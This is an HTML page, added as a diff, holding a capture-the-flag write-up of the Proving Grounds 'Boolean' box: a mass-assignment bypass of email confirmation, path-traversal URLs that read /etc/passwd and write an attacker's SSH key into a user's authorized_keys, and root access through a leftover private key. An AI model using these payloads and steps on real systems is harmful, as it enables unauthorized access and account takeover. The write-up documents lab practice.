@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Boolean &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Boolean</h1>
+    <div class="meta">Target: <code>192.168.176.231</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">WebApp</span><span class="tag">AuthBypass</span><span class="tag">MassAssignment</span><span class="tag">PathTraversal</span><span class="tag">SSH</span><span class="tag">SSHKeyInjection</span><span class="tag">SSHConfig</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration-port-80">Web Enumeration, Port 80</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#mass-assignment-bypass-email-confirmation">Mass Assignment Bypass, Email Confirmation</a><a class="lvl3" href="#path-traversal-file-read">Path Traversal, File Read</a><a class="lvl3" href="#ssh-key-injection-via-file-write">SSH Key Injection via File Write</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#pre-placed-root-ssh-key">Pre-Placed Root SSH Key</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Boolean is a Proving Grounds Linux box where the web application's email-confirmation flow has a mass assignment vulnerability: the <code>confirmed</code> field on the user object is writable via a POST parameter, so you set it to <code>True</code> and bypass the email gate. Authenticated access reveals a file manager with a path traversal in its <code>cwd</code> download parameter, which allows arbitrary file read and write. Writing your SSH public key into <code>remi</code>'s <code>.ssh/authorized_keys</code> gives initial access. Root access comes from an SSH key left in remi's <code>.ssh/keys/</code> directory, paired with a tweaked <code>.ssh/config</code> to avoid authentication failures from too many keys being offered.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian
+80/tcp    open  http    (redirects to /login)
+33017/tcp open  http    Apache httpd 2.4.38 (Debian)
+|_http-title: Development
+</code></pre>
+<p>Port 33017 is a dead-end development placeholder. All exploitation goes through port 80.</p>
+<h3 id="web-enumeration-port-80">Web Enumeration, Port 80</h3>
+<pre><code class="language-sh">gobuster dir -u http://192.168.176.231/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt
+
+/404        (Status: 200)
+/filemanager (Status: 302) [--&gt; /login]
+/login      (Status: 200)
+/register   (Status: 200)
+/robots.txt (Status: 200)
+</code></pre>
+<p>The app allows registration but gates full access behind email confirmation.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="mass-assignment-bypass-email-confirmation">Mass Assignment Bypass, Email Confirmation</h3>
+<p>After registering an account and logging in, the registration confirmation page accepts a <code>PATCH</code> to <code>/settings/email</code>. Intercepting this request in Burp reveals the full request body:</p>
+<pre><code class="language-http">POST /settings/email HTTP/1.1
+...
+_method=patch&amp;authenticity_token=...&amp;user%5Bconfirmed%5D=True&amp;email%5D=test%40test.com&amp;commit=Change%20email
+</code></pre>
+<p>The response includes the full user object as JSON:</p>
+<pre><code class="language-json">{&quot;email&quot;:&quot;test@test.com&quot;,&quot;id&quot;:1,&quot;username&quot;:&quot;test&quot;,&quot;confirmed&quot;:false,...}
+</code></pre>
+<p>The <code>confirmed</code> field in the response is <code>false</code>. The request body already includes <code>user[confirmed]=True</code>, but the initial response suggests the server may be ignoring it. Resending the intercepted request and checking the response shows the field flips:</p>
+<pre><code class="language-json">{&quot;confirmed&quot;:true,&quot;id&quot;:1,&quot;username&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;,...}
+</code></pre>
+<blockquote>
+<p><strong>What mass assignment is:</strong> the server accepts user-supplied fields and maps them directly to model attributes without a whitelist. The <code>confirmed</code> field should only be set by the email verification system, but because the PATCH endpoint doesn't restrict which attributes can be written, any client can set it. Forwarding all requests in Burp after the confirmation flips grants access to the file manager as a fully authenticated user.</p>
+</blockquote>
+<h3 id="path-traversal-file-read">Path Traversal, File Read</h3>
+<p>The file manager's download parameter is vulnerable:</p>
+<pre><code>http://192.168.176.231/?cwd=/../../../../../etc&amp;file=passwd&amp;download=true
+</code></pre>
+<p>This downloads <code>/etc/passwd</code>, confirming the traversal works. The <code>passwd</code> file reveals user <code>remi</code> with a home directory at <code>/home/remi</code>.</p>
+<h3 id="ssh-key-injection-via-file-write">SSH Key Injection via File Write</h3>
+<p>The traversal parameter also controls the upload destination. The file manager's upload function combined with the <code>cwd</code> traversal writes arbitrary files to arbitrary paths.</p>
+<p>Generate an SSH keypair on the attacking machine:</p>
+<pre><code class="language-sh">ssh-keygen
+# saves to /home/kali/.ssh/id_ed25519 and id_ed25519.pub
+cp /home/kali/.ssh/id_ed25519.pub authorized_keys
+</code></pre>
+<p>Confirm remi's <code>.ssh</code> directory exists:</p>
+<pre><code>http://192.168.176.231/?cwd=../../../../../../../home/remi&amp;file=.ssh&amp;download=true
+</code></pre>
+<p>Upload <code>authorized_keys</code> to remi's <code>.ssh</code> directory:</p>
+<pre><code>http://192.168.176.231/?cwd=../../../../../../../home/remi/.ssh&amp;download=true
+</code></pre>
+<p>SSH in as remi:</p>
+<pre><code class="language-sh">ssh -i id_ed25519 remi@192.168.176.231
+remi@boolean:~$
+</code></pre>
+<pre><code class="language-sh">remi@boolean:~$ cat local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="pre-placed-root-ssh-key">Pre-Placed Root SSH Key</h3>
+<p>Remi's <code>.ssh/</code> directory contains a <code>keys</code> subdirectory:</p>
+<pre><code>remi@boolean:~/.ssh/keys$ dir
+id_rsa  id_rsa.1  id_rsa.2  root
+</code></pre>
+<p>The file named <code>root</code> is a private key. Attempting to SSH to localhost as root using it fails:</p>
+<pre><code class="language-sh">ssh -i /home/remi/root root@127.0.0.1
+Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
+</code></pre>
+<blockquote>
+<p><strong>Why "too many authentication failures" occurs:</strong> SSH offers all available keys from the agent and <code>~/.ssh/</code> before trying the explicitly specified one. Each failed key offer counts as an authentication attempt. With multiple keys in the directory, the server hits its <code>MaxAuthTries</code> limit before the correct key is offered.</p>
+</blockquote>
+<p>The fix is an <code>.ssh/config</code> entry that tells SSH to use only the specified key and ignore the agent:</p>
+<pre><code>IdentitiesOnly yes
+IdentityAgent none
+</code></pre>
+<p>This config file doesn't exist for remi yet, so create it on Kali and upload it to <code>/home/remi/.ssh/config</code> using the same path traversal upload technique:</p>
+<pre><code>http://192.168.176.231/?cwd=../../../../../../../home/remi/.ssh&amp;download=true
+</code></pre>
+<p>With the config in place, the SSH connection succeeds:</p>
+<pre><code class="language-sh">remi@boolean:~/.ssh$ ssh -i /home/remi/root root@127.0.0.1
+...
+debug1: Authentication succeeded (publickey).
+root@boolean:~#
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">root@boolean:~# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Mass assignment lets you write fields you shouldn't own.</strong> Any API that reflects model attributes should be tested for parameter injection against protected fields like <code>confirmed</code>, <code>role</code>, or <code>admin</code>.</li>
+<li><strong>File manager <code>cwd</code> parameters are a classic traversal target.</strong> The ability to set the working directory for both read and write turns arbitrary path traversal into full filesystem access.</li>
+<li><strong>SSH key injection is a reliable foothold when you have arbitrary file write.</strong> Write your public key to <code>~/.ssh/authorized_keys</code> and the account is yours without cracking anything.</li>
+<li><strong>SSH <code>IdentitiesOnly yes</code> + <code>IdentityAgent none</code> is the fix for "too many authentication failures."</strong> Without it, SSH offers every available key before the specified one, exhausting <code>MaxAuthTries</code>.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
